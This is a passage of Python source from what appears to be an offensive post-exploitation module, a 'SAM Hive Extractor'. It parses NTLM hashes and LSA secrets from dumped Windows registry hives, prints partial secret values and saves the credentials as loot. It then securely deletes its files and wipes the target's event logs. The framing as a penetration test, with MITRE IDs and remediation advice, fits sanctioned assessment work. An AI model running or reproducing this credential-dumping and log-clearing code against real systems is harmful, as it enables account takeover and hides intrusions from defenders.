                        confidence='verified'
                    )
                    
                    # Update hive
                    sam_hive.hash_count = len(hashes)
                    
                    if admin_count > 0:
                        self.finding(
                            title=f"Admin NTLM Hashes Extracted — {admin_count} accounts",
                            description=f"NTLM hashes extracted for {admin_count} admin accounts. These can be used for Pass-the-Hash attacks.",
                            severity="critical",
                            recommendation="Rotate all admin passwords immediately. Enable Credential Guard. Implement MFA.",
                            mitre_id='T1003.002',
                        )
                        findings_created += 1
                else:
                    sections.append("  ❌ No hashes extracted")
        
        # ── Step 7: LSA Secrets ───────────────────────────────────────────
        if lsa_secrets and success:
            sections.append("\n[*] Phase 6: LSA Secrets Extraction")
            sections.append("─"*64)
            
            security_hive = next((h for h in hives if h.hive_type == 'SECURITY'), None)
            system_hive = next((h for h in hives if h.hive_type == 'SYSTEM'), None)
            
            if security_hive and system_hive:
                secrets = HashParser.parse_lsa_secrets(
                    self._exec, session, security_hive.file_path, system_hive.file_path
                )
                
                if secrets:
                    sections.append(f"  ✅ {len(secrets)} LSA secrets extracted:")
                    
                    for secret in secrets[:10]:
                        sections.append(f"    • {secret.secret_name}")
                        sections.append(f"        Type: {secret.secret_type}")
                        sections.append(f"        Value: {secret.secret_value[:50]}...")
                    
                    # Save to loot
                    self.loot(
                        {
                            "type": "lsa_secrets",
                            "secrets": [s.to_dict() for s in secrets],
                            "count": len(secrets),
                        },
                        category='credentials',
                        source='sam-hive-extractor:lsa_secrets',
                        confidence='verified'
                    )
                    
                    # Update hive
                    security_hive.lsa_secret_count = len(secrets)
                    
                    self.finding(
                        title=f"LSA Secrets Extracted — {len(secrets)} secrets",
                        description=f"LSA secrets extracted from SECURITY hive. These may contain service account passwords and other sensitive credentials.",
                        severity="critical",
                        recommendation="Rotate all service account passwords. Review LSA secret storage. Enable Credential Guard.",
                        mitre_id='T1003.004',
                    )
                    findings_created += 1
                else:
                    sections.append("  ❌ No LSA secrets extracted")
        
        # ── Step 8: Cleanup ───────────────────────────────────────────────
        if cleanup and success:
            sections.append("\n[*] Phase 7: Secure Cleanup")
            sections.append("─"*64)
            
            paths_to_clean = [h.file_path for h in hives]
            paths_to_clean.append(output_dir)
            
            sections.append(f"  [*] Securely deleting {len(paths_to_clean)} paths...")
            
            if CleanupEngine.secure_delete(self._exec, session, paths_to_clean):
                sections.append(f"  ✅ Cleanup complete")
                
                if CleanupEngine.cleanup_event_logs(self._exec, session):
                    sections.append(f"  ✅ Event logs cleaned")
            else:
                sections.append(f"  ❌ Cleanup failed")
        
        # ── Summary ───────────────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 SAM Extraction Summary]")
        sections.append("━"*64)
        sections.append(f"  Hives Extracted: {len(hives) if success else 0}")
        sections.append(f"  Hashes Parsed: {sum(h.hash_count for h in hives) if success else 0}")
        sections.append(f"  LSA Secrets: {sum(h.lsa_secret_count for h in hives) if success else 0}")
        sections.append(f"  Boot Key: {'✅ Extracted' if extract_bootkey and success else '❌ N/A'}")
        sections.append(f"  Findings Created: {findings_created}")
        sections.append(f"  Duration: {duration}s")
        
        # ── Save to Loot ──────────────────────────────────────────────────
        self.loot(
            {
                "type": "sam_extraction_session",
                "protection": protection.to_dict(),
                "hives": [h.to_dict() for h in hives] if success else [],
                "findings_count": findings_created,
                "duration": duration,
            },
            category='credentials',
            source='sam-hive-extractor',
            confidence='high'
        )
        
        self.info(f"🔐 SAM Hive Extractor complete — {len(hives) if success else 0} hives, {findings_created} findings")
        
        return '\n'.join(sections)
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''